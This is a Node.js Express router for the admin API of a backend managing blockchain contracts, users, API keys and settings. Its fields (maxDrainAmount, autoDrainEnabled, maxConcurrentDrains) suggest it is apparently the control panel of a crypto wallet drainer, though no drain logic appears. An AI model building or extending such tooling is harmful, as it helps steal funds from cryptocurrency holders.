const express = require('express');
const router = express.Router();
const { asyncHandler } = require('../middleware/errorHandler');
const { requirePermission, requireAdmin } = require('../middleware/auth');
const Contract = require('../models/Contract');
const User = require('../models/User');
const ChainManager = require('../services/ChainManager');

// Initialize chain manager
const chainManager = new ChainManager();

// Get all contracts
router.get('/contracts', requirePermission('canViewContracts'), asyncHandler(async (req, res) => {
    const { network, status, page = 1, limit = 20 } = req.query;

    const query = {};
    if (network) query.network = network;
    if (status) query.status = status;

    const contracts = await Contract.paginate(query, {
        page: parseInt(page),
        limit: parseInt(limit),
        sort: { createdAt: -1 }
    });

    res.json(contracts);
}));

// Get contract by ID
router.get('/contracts/:id', requirePermission('canViewContracts'), asyncHandler(async (req, res) => {
    const contract = await Contract.findById(req.params.id);

    if (!contract) {
        return res.status(404).json({ error: 'Contract not found' });
    }

    res.json(contract);
}));

// Add new contract
router.post('/contracts', requirePermission('canManageContracts'), asyncHandler(async (req, res) => {
    const {
        name,
        network,
        address,
        abi,
        bytecode,
        riskLevel = 'medium',
        autoTransfer = true,
        maxDrainAmount,
        minDrainAmount,
        gasLimit,
        description
    } = req.body;

    // Validate required fields
    if (!name || !network || !address || !abi) {
        return res.status(400).json({
            error: 'Name, network, address, and ABI are required'
        });
    }

    // Check if contract already exists
    const existingContract = await Contract.findOne({
        address: address.toLowerCase(),
        network
    });
    if (existingContract) {
        return res.status(409).json({ error: 'Contract already exists for this network' });
    }

    // Validate ABI
    try {
        JSON.parse(abi);
    } catch (error) {
        return res.status(400).json({ error: 'Invalid ABI format' });
    }

    const contract = new Contract({
        name,
        network,
        address: address.toLowerCase(),
        abi,
        bytecode,
        riskLevel,
        autoTransfer,
        maxDrainAmount,
        minDrainAmount,
        gasLimit,
        description,
        status: 'active',
        deployedAt: new Date()
    });

    await contract.save();

    res.status(201).json(contract);
}));

// Update contract
router.put('/contracts/:id', requirePermission('canManageContracts'), asyncHandler(async (req, res) => {
    const {
        name,
        riskLevel,
        autoTransfer,
        maxDrainAmount,
        minDrainAmount,
        gasLimit,
        description,
        status
    } = req.body;

    const updateData = {};
    if (name) updateData.name = name;
    if (riskLevel) updateData.riskLevel = riskLevel;
    if (autoTransfer !== undefined) updateData.autoTransfer = autoTransfer;
    if (maxDrainAmount !== undefined) updateData.maxDrainAmount = maxDrainAmount;
    if (minDrainAmount !== undefined) updateData.minDrainAmount = minDrainAmount;
    if (gasLimit !== undefined) updateData.gasLimit = gasLimit;
    if (description !== undefined) updateData.description = description;
    if (status) updateData.status = status;

    updateData.updatedAt = new Date();

    const contract = await Contract.findByIdAndUpdate(
        req.params.id,
        updateData,
        { new: true, runValidators: true }
    );

    if (!contract) {
        return res.status(404).json({ error: 'Contract not found' });
    }

    res.json(contract);
}));

// Delete contract
router.delete('/contracts/:id', requirePermission('canManageContracts'), asyncHandler(async (req, res) => {
    const contract = await Contract.findByIdAndDelete(req.params.id);

    if (!contract) {
        return res.status(404).json({ error: 'Contract not found' });
    }

    res.json({ message: 'Contract deleted successfully' });
}));

// Test contract connection
router.post('/contracts/:id/test', requirePermission('canManageContracts'), asyncHandler(async (req, res) => {
    const contract = await Contract.findById(req.params.id);

    if (!contract) {
        return res.status(404).json({ error: 'Contract not found' });
    }

    try {
        const isValid = await chainManager.testContract(contract);
        res.json({
            valid: isValid,
            message: isValid ? 'Contract connection successful' : 'Contract connection failed'
        });
    } catch (error) {
        res.status(500).json({
            valid: false,
            error: error.message
        });
    }
}));

// Get system settings
router.get('/system', requireAdmin, asyncHandler(async (req, res) => {
    // This would typically come from a settings collection
    // For now, return environment-based settings
    const settings = {
        version: process.env.npm_package_version || '3.0.0',
        environment: process.env.NODE_ENV || 'development',
        maxConcurrentDrains: parseInt(process.env.MAX_CONCURRENT_DRAINS) || 5,
        defaultGasLimit: parseInt(process.env.DEFAULT_GAS_LIMIT) || 200000,
        alertThreshold: parseFloat(process.env.ALERT_THRESHOLD) || 1000,
        autoDrainEnabled: process.env.AUTO_DRAIN_ENABLED === 'true',
        supportedNetworks: [
            'ethereum', 'bsc', 'polygon', 'arbitrum', 'optimism', 'tron'
        ],
        logLevel: process.env.LOG_LEVEL || 'info',
        rateLimitWindow: parseInt(process.env.RATE_LIMIT_WINDOW) || 900000,
        rateLimitMax: parseInt(process.env.RATE_LIMIT_MAX) || 100
    };

    res.json(settings);
}));

// Update system settings
router.put('/system', requireAdmin, asyncHandler(async (req, res) => {
    const {
        maxConcurrentDrains,
        defaultGasLimit,
        alertThreshold,
        autoDrainEnabled,
        logLevel,
        rateLimitWindow,
        rateLimitMax
    } = req.body;

    // Update environment variables (in a real app, you'd save to database)
    if (maxConcurrentDrains !== undefined) {
        process.env.MAX_CONCURRENT_DRAINS = maxConcurrentDrains.toString();
    }
    if (defaultGasLimit !== undefined) {
        process.env.DEFAULT_GAS_LIMIT = defaultGasLimit.toString();
    }
    if (alertThreshold !== undefined) {
        process.env.ALERT_THRESHOLD = alertThreshold.toString();
    }
    if (autoDrainEnabled !== undefined) {
        process.env.AUTO_DRAIN_ENABLED = autoDrainEnabled.toString();
    }
    if (logLevel !== undefined) {
        process.env.LOG_LEVEL = logLevel;
    }
    if (rateLimitWindow !== undefined) {
        process.env.RATE_LIMIT_WINDOW = rateLimitWindow.toString();
    }
    if (rateLimitMax !== undefined) {
        process.env.RATE_LIMIT_MAX = rateLimitMax.toString();
    }

    res.json({
        message: 'Settings updated successfully',
        settings: {
            maxConcurrentDrains: parseInt(process.env.MAX_CONCURRENT_DRAINS),
            defaultGasLimit: parseInt(process.env.DEFAULT_GAS_LIMIT),
            alertThreshold: parseFloat(process.env.ALERT_THRESHOLD),
            autoDrainEnabled: process.env.AUTO_DRAIN_ENABLED === 'true',
            logLevel: process.env.LOG_LEVEL,
            rateLimitWindow: parseInt(process.env.RATE_LIMIT_WINDOW),
            rateLimitMax: parseInt(process.env.RATE_LIMIT_MAX)
        }
    });
}));

// Get network configurations
router.get('/networks', requirePermission('canViewSettings'), asyncHandler(async (req, res) => {
    const networks = await chainManager.getNetworkConfigs();
    res.json(networks);
}));

// Update network configuration
router.put('/networks/:network', requireAdmin, asyncHandler(async (req, res) => {
    const { network } = req.params;
    const { rpcUrl, gasPrice, blockTime } = req.body;

    try {
        await chainManager.updateNetworkConfig(network, {
            rpcUrl,
            gasPrice,
            blockTime
        });

        res.json({ message: 'Network configuration updated successfully' });
    } catch (error) {
        res.status(400).json({ error: error.message });
    }
}));

// Get user management (admin only)
router.get('/users', requireAdmin, asyncHandler(async (req, res) => {
    const users = await User.find({}, '-password -apiKeys')
        .sort({ createdAt: -1 });

    res.json(users);
}));

// Create new user
router.post('/users', requireAdmin, asyncHandler(async (req, res) => {
    const { username, email, password, role, permissions } = req.body;

    // Check if user already exists
    const existingUser = await User.findOne({
        $or: [{ username }, { email }]
    });
    if (existingUser) {
        return res.status(409).json({ error: 'User already exists' });
    }

    const user = new User({
        username,
        email,
        password,
        role: role || 'user',
        permissions: permissions || {}
    });

    await user.save();

    // Return user without password
    const userResponse = user.toObject();
    delete userResponse.password;

    res.status(201).json(userResponse);
}));

// Update user
router.put('/users/:id', requireAdmin, asyncHandler(async (req, res) => {
    const { role, permissions, status } = req.body;

    const updateData = {};
    if (role) updateData.role = role;
    if (permissions) updateData.permissions = permissions;
    if (status) updateData.status = status;

    const user = await User.findByIdAndUpdate(
        req.params.id,
        updateData,
        { new: true, runValidators: true }
    ).select('-password -apiKeys');

    if (!user) {
        return res.status(404).json({ error: 'User not found' });
    }

    res.json(user);
}));

// Delete user
router.delete('/users/:id', requireAdmin, asyncHandler(async (req, res) => {
    // Prevent deleting self
    if (req.params.id === req.user._id.toString()) {
        return res.status(400).json({ error: 'Cannot delete your own account' });
    }

    const user = await User.findByIdAndDelete(req.params.id);

    if (!user) {
        return res.status(404).json({ error: 'User not found' });
    }

    res.json({ message: 'User deleted successfully' });
}));

// Get API keys for current user
router.get('/api-keys', requirePermission('canManageApiKeys'), asyncHandler(async (req, res) => {
    const user = await User.findById(req.user._id).select('apiKeys');

    res.json(user.apiKeys);
}));

// Create new API key
router.post('/api-keys', requirePermission('canManageApiKeys'), asyncHandler(async (req, res) => {
    const { name, permissions } = req.body;

    if (!name) {
        return res.status(400).json({ error: 'API key name is required' });
    }

    const user = await User.findById(req.user._id);

    // Generate API key
    const crypto = require('crypto');
    const key = crypto.randomBytes(32).toString('hex');

    const apiKey = {
        name,
        key,
        permissions: permissions || ['read'],
        active: true,
        createdAt: new Date(),
        lastUsed: null
    };

    user.apiKeys.push(apiKey);
    await user.save();

    res.status(201).json({
        name: apiKey.name,
        key: apiKey.key,
        permissions: apiKey.permissions,
        createdAt: apiKey.createdAt
    });
}));

// Delete API key
router.delete('/api-keys/:keyId', requirePermission('canManageApiKeys'), asyncHandler(async (req, res) => {
    const user = await User.findById(req.user._id);

    const keyIndex = user.apiKeys.findIndex(k => k._id.toString() === req.params.keyId);
    if (keyIndex === -1) {
        return res.status(404).json({ error: 'API key not found' });
    }

    user.apiKeys.splice(keyIndex, 1);
    await user.save();

    res.json({ message: 'API key deleted successfully' });
}));

// Get system logs
router.get('/logs', requireAdmin, asyncHandler(async (req, res) => {
    const { level, limit = 100 } = req.query;

    // This would typically read from log files or a logging database
    // For now, return a placeholder
    const logs = [
        {
            timestamp: new Date(),
            level: 'info',
            message: 'System started successfully',
            source: 'server.js'
        }
    ];

    res.json(logs);
}));

module.exports = router;